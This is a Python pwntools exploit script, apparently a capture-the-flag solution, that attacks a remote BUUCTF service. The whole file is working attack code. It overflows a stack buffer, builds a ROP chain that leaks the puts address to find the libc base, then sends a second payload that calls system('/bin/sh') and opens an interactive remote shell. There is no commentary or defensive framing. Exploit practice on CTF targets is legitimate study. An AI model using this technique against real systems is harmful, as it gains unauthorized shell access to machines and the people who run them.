```python
from pwn import *
#context(os='linux', arch='amd64', log_level='debug')
r=remote('node5.buuoj.cn',27911)
libc=ELF('libc-2.27.so')
elf=ELF('./cis')

rdi=0x400713
ret=0x4004c9
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
puts_libc=libc.sym['puts']
main=0x400636

r.sendlineafter('tell me your name\n',p64(0x00))
payload1=b'a'*0x28+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
r.sendlineafter('What do you want to say to me?\n',payload1)
puts=u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts))#看看接收成功没

r.sendlineafter('tell me your name\n',p64(0x00))
base=puts-puts_libc
sys=base+libc.sym['system']
binsh=base+next(libc.search(b'/bin/sh'))

payload2=b'a'*0x28+p64(ret)+p64(rdi)+p64(binsh)+p64(sys)
r.sendlineafter('What do you want to say to me?\n',payload2)
r.interactive()
```
